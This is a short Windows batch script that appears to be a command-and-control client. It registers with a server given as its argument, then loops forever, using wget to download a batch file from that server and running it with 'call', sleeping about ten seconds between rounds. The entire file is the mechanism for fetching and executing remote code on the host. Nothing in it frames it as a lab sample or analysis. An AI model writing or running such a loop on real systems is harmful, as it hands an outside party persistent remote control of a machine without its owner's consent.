@echo off
:init
set server=%1
set request_sleep=10

:: Register to the server
.\tools\wget.exe -q --output-document=out.bat %server%?action=register

:start

	:: Download the script
	.\tools\wget.exe -q --output-document=command.bat %server%
	:: Run the script
	call command.bat
	:: sleep
	ping -n %request_sleep% 127.0.0.1 >nul

goto start
:end
